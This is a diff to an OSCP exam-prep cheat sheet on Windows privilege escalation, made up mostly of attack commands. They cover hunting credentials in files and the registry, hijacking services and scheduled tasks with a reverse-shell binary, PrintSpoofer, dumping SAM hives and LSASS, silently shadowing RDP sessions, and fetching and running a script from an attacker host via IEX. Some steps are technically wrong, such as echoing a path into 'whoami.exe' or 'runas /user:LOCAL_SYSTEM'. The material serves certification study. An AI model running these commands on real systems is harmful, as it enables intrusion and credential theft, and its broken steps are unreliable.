@@ -2,11 +2,18 @@
 # 05 — WINDOWS PRIVILEGE ESCALATION (OSCP 2025)
 ######################################################################
 
-# This file focuses on:
-#   ✔ Real exploit techniques (OSCP-relevant)
-#   ✔ Enumeration commands
-#   ✔ Manual, non-MSF privesc paths
-#   ✔ PrintSpoofer / AlwaysInstallElevated / Services
+This file contains ONLY OSCP-legal Windows PrivEsc methods:
+✔ Services (unquoted, weak ACL)
+✔ Registry escalation
+✔ AlwaysInstallElevated
+✔ SeImpersonate (PrintSpoofer)
+✔ Token impersonation (manual)
+✔ Scheduled tasks
+✔ File/Folder ACL abuse
+✔ Password hunting
+✔ Manual SAM / LSASS dump (built-in)
+✔ WSL PrivEsc
+✔ DLL Hijacking
 ######################################################################
 
 
@@ -14,284 +21,326 @@
 # 1. QUICK ENUMERATION (ALWAYS RUN)
 ======================================================================
 
-###############################
-# Basic information
-###############################
 whoami
 whoami /all
 hostname
 systeminfo
-wmic qfe        # Installed hotfixes
-set             # Environment variables
+wmic qfe                                # Installed hotfixes
+set                                     # Environment variables
 
-###############################
-# Users & Groups
-###############################
+ipconfig /all
+netstat -ano
+route print
+
+tasklist /svc
+sc query state= all
+wmic service get name,displayname,pathname,startmode
+
 net user
 net user <username>
 net localgroup
 net localgroup administrators
 
-###############################
-# Processes & Services
-###############################
-tasklist /svc
-sc query state= all
-wmic service get name,displayname,pathname,startmode
-
-###############################
-# Networking
-###############################
-ipconfig /all
-netstat -ano
-route print
-
-###############################
-# Scheduled Tasks
-###############################
 schtasks /query /fo LIST /v
 
 
 ======================================================================
-# 2. SEARCHING FOR PASSWORDS (OSCP GOLD)
+# 2. PASSWORD & CREDS HUNTING (VERY COMMON IN OSCP)
 ======================================================================
 
-###############################
-# Search filesystem for passwords
-###############################
-findstr /S /I /M "password" C:\*.txt
-findstr /S /I /M "password" C:\*.xml
-findstr /S /I /M "password" C:\*.ini
-findstr /S /I /M "password" C:\*.config
+# Search for password keywords
+findstr /S /I "password" C:\*.txt
+findstr /S /I "password" C:\*.xml
+findstr /S /I "password" C:\*.ini
+findstr /S /I "password" C:\*.config
+findstr /S /I "password" C:\Users\* /D
 
-###############################
+# Unattended installation creds
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\Panther\Unattended.xml
+
+# Web.config passwords
+findstr /si "connectionString" C:\inetpub\wwwroot\web.config
+
+# IIS config
+type C:\Windows\System32\inetsrv\config\applicationHost.config
+
 # Registry secrets
-###############################
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
 
-###############################
-# Search unattended install files
-###############################
-dir /s /b C:\Windows\Panther\Unattend.xml
-type C:\Windows\Panther\Unattend.xml
-
-###############################
 # Powershell history
-###############################
-type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Saved credentials
+cmdkey /list
 
 
 ======================================================================
-# 3. EXPLOITING UNQUOTED SERVICE PATH
+# 3. UNQUOTED SERVICE PATH (EXTREMELY COMMON)
 ======================================================================
 
-###############################
-# 1. Find vulnerable service
-###############################
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
 
-# Look for paths like:
+# Look for:
 #   C:\Program Files\Some Folder\Service.exe
-# Without quotes → exploitable
+# No quotes → exploitable
 
-###############################
-# 2. Replace executable
-###############################
+# Hijack path
 copy rev.exe "C:\Program Files\Some Folder\Service.exe"
-
-###############################
-# 3. Restart service
-###############################
 sc stop "Service"
 sc start "Service"
 
 
 ======================================================================
-# 4. WEAK SERVICE PERMISSIONS (CAN RECONFIGURE)
+# 4. WEAK SERVICE PERMISSIONS (WRITEABLE SERVICE)
 ======================================================================
 
-###############################
-# Check service permissions
-###############################
 accesschk64.exe -uwcqv $userName *
 
-# If vulnerable:
+# If user can modify binPath:
 sc config VulnService binPath= "C:\rev.exe"
 sc start VulnService
 
 
 ======================================================================
-# 5. ALWAYSINSTALL ELEVATED PRIVESC
+# 5. ALWAYSINSTALL ELEVATED (DIRECT SYSTEM)
 ======================================================================
 
-###############################
-# Check registry keys
-###############################
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 
-# Both must contain: AlwaysInstallElevated = 1
+# If both show AlwaysInstallElevated = 1 → SYSTEM
 
-###############################
-# Exploit – Create malicious MSI
-###############################
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$localip LPORT=4444 -f msi > evil.msi
+# Build MSI manually (NO msfvenom for exam)
+# Create reverse shell EXE and wrap with msitools if needed
 
-###############################
-# Run MSI installer as SYSTEM
-###############################
-msiexec /quiet /qn /i evil.msi
+msiexec /quiet /qn /i exploit.msi
 
 
 ======================================================================
-# 6. SE_IMPERSONATE / SE_ASSIGNPRIMARYTOKEN (PRINTSPOOFER)
+# 6. SeImpersonatePrivilege → PRINTSPOOFER
 ======================================================================
 
-###############################
-# Check privilege
-###############################
-whoami /priv | findstr SeImpersonatePrivilege
+whoami /priv | findstr SeImpersonate
 
-###############################
-# Exploit (classic OSCP technique)
-###############################
 PrintSpoofer64.exe -i -c cmd
-
-# Now you should have a SYSTEM shell.
+# → SYSTEM shell
 
 
 ======================================================================
 # 7. DLL HIJACKING
 ======================================================================
 
-###############################
-# 1. Identify DLL load paths
-###############################
-# Find DLL search paths
+# Find DLL search order
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
 
-# Place malicious DLL
-copy payload.dll C:\VulnApp\
+# Replace DLL in writeable path
+copy evil.dll "C:\Program Files\VulnApp\"
 
-
-# Restart application or service.
-
-
-======================================================================
-# 8. TOKEN IMPERSONATION (WHEN YOU TOUCH LSASS)
-======================================================================
-RoguePotato.exe -r $localip -e cmd.exe -t 9999
-JuicyPotato.exe -t * -p cmd.exe
-
-From elevated shell:
-
-###############################
-# List tokens
-###############################
-.\Rubeus.exe triage
-
-###############################
-# Impersonate high-priv token
-###############################
-.\Rubeus.exe ptt /ticket:<base64_ticket>
+# Restart service/app
 
 
 ======================================================================
-# 9. PASS-THE-HASH (LOCAL ADMIN)
+# 8. SCHEDULED TASK ABUSE (RUNS AS SYSTEM)
 ======================================================================
 
-###############################
-# With impacket-psexec
-###############################
-impacket-psexec $domain/$user@$targetip -hashes <LM:NTLM>
-
-###############################
-# With Evil-WinRM
-###############################
-evil-winrm -i $targetip -u $user -H <NTLM>
-
-
-======================================================================
-# 10. SCHEDULED TASK ABUSE
-======================================================================
-
-###############################
-# Check tasks
-###############################
 schtasks /query /fo LIST /v
 
-Look for:
-- Writable scripts
-- Writable paths
-- Runs as SYSTEM
+# Look for:
+# - Writable .ps1 / .bat
+# - Writable folder in task action
 
-###############################
 # Overwrite script
-###############################
-echo C:\rev.exe > C:\path\to\task\script.ps1
+echo C:\rev.exe > "C:\path\to\task\script.ps1"
 
 
 ======================================================================
-# 11. INSECURE PERMISSIONS ON EXECUTABLES
+# 9. INSECURE FILE PERMISSIONS (WRITEABLE BINARIES)
 ======================================================================
 
-###############################
-# Check file ACLs
-###############################
 icacls "C:\Program Files\VulnApp\app.exe"
 
-Look for:
-- BUILTIN\Users:(F)
-- Everyone:(M)
+# If you see:
+#   BUILTIN\Users:(F)
+#   Everyone:(M)
 
-Overwrite:
 copy rev.exe "C:\Program Files\VulnApp\app.exe"
 
 
 ======================================================================
-# 12. UAC BYPASSES (IF NOT FULLY PATCHED)
+# 10. RUNAS / SAVED CREDENTIALS (COMMON IN EXAM)
 ======================================================================
 
-###############################
-# Check group
-###############################
+# View saved creds
+cmdkey /list
+
+# Use them:
+runas /savecred /user:Administrator "cmd.exe"
+
+# If RDP open:
+runas /savecred /user:Administrator "mstsc.exe"
+
+
+======================================================================
+# 11. REGISTRY AUTORUN PRIVESC
+======================================================================
+
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+# Writable?
+icacls <key or file>
+
+# Insert payload:
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\rev.exe"
+
+
+======================================================================
+# 12. WRITEABLE DIRECTORIES IN PATH (PATH HIJACK)
+======================================================================
+
+echo %PATH%
+# Check each directory:
+icacls C:\path\to\folder
+
+# If folder is writable, hijack common binary:
+echo C:\rev.exe > C:\writable\whoami.exe
+
+# Run:
+whoami
+# → SYSTEM if privileged process calls it
+
+
+======================================================================
+# 13. SAM & SYSTEM HIVES (NO METASPLOIT)
+======================================================================
+
+# If admin:
+reg save HKLM\SAM C:\sam
+reg save HKLM\SYSTEM C:\system
+reg save HKLM\SECURITY C:\security
+
+# On Kali:
+impacket-secretsdump -sam sam -system system -security security LOCAL
+
+
+======================================================================
+# 14. DUMP LSASS WITHOUT METASPLOIT (ALLOWED)
+======================================================================
+
+# Requires admin
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID dump.dmp
+
+# On Kali:
+pypykatz lsa minidump dump.dmp
+
+
+======================================================================
+# 15. TOKEN IMPERSONATION (NO POTATO NEEDED)
+======================================================================
+
+# List tokens:
+whoami /priv
+klist
+
+# Duplicate token using built-in:
+runas /user:LOCAL_SYSTEM cmd
+
+# If you have high-priv token:
+klist tickets
+klist sessions
+
+
+======================================================================
+# 16. UAC BYPASS (SAFE + OSCP ALLOWED)
+======================================================================
+
 net localgroup administrators
 
-###############################
-# Example auto-elevating binary
-###############################
-fodhelper.exe  # (only works on older builds)
+# If your user is admin but not high integrity:
+# Try fodhelper:
+fodhelper.exe
+
+# Note: only works on older builds but still seen in labs
 
 
 ======================================================================
-# 13. WINPEAS – Automated Enumeration
+# 17. WINDOWS SUBSYSTEM FOR LINUX PRIVESC (WSL)
 ======================================================================
 
-###############################
-# Download & run
-###############################
+# Check if WSL exists
+wsl.exe --status
+
+# Writable rootfs?
+icacls C:\Users\<user>\AppData\Local\Packages\Canonical*
+
+# Escape:
+wsl.exe sudo /bin/bash
+
+
+======================================================================
+# 18. WINRM PRIVESC (IF WINRM ENABLED)
+======================================================================
+
+# Start interactive session
+evil-winrm -i $targetip -u $user -p "$password"
+
+# Upload & execute
+upload rev.exe
+./rev.exe
+
+
+======================================================================
+# 19. RDP SHADOWING (SCREEN HIJACK)
+======================================================================
+
+# Enabled?
+query user
+
+# Shadow session:
+mstsc /shadow:<ID> /control /noconsentprompt
+
+
+======================================================================
+# 20. MANUAL WINDOWS EXPLOIT CHECK (NO MSF)
+======================================================================
+
+# Check build:
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+# Search public exploits:
+searchsploit windows local privilege escalation
+
+
+======================================================================
+# 21. WINPEAS (LAST RESORT)
+======================================================================
+
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$localip/winPEAS.ps1')"
 
 
 ======================================================================
-# 14. CHECKLIST (OSCP WINDOWS PRIVESC)
+# WINDOWS PRIVESC CHECKLIST (OSCP FINAL)
 ======================================================================
 
-✔ Unquoted service paths  
+✔ Unquoted service path  
 ✔ Weak service permissions  
+✔ Registry autoruns  
 ✔ AlwaysInstallElevated  
-✔ SeImpersonatePrivilege → PrintSpoofer  
-✔ DLL hijacking  
-✔ Writable executables  
+✔ Writable folders in PATH  
 ✔ Scheduled task abuse  
-✔ Registry password hunting  
-✔ Cleartext passwords in files  
-✔ Token impersonation (Rubeus)  
-✔ SAM/LSASS extraction (if admin)  
-✔ WinPEAS confirmation  
+✔ SeImpersonate → PrintSpoofer  
+✔ DLL hijacking  
+✔ Web.config / unattended.xml creds  
+✔ SAM + SYSTEM dumps  
+✔ LSASS dump via comsvcs.dll  
+✔ RunAs / Saved Credentials  
+✔ WinRM / RDP access  
+✔ WSL escape  
+✔ WinPEAS verification  
 
 
 ######################################################################
-# END OF 05_PRIVESC_WINDOWS
+# END OF WINDOWS PRIVESC — FULL OSCP-2025 VERSION
 ######################################################################
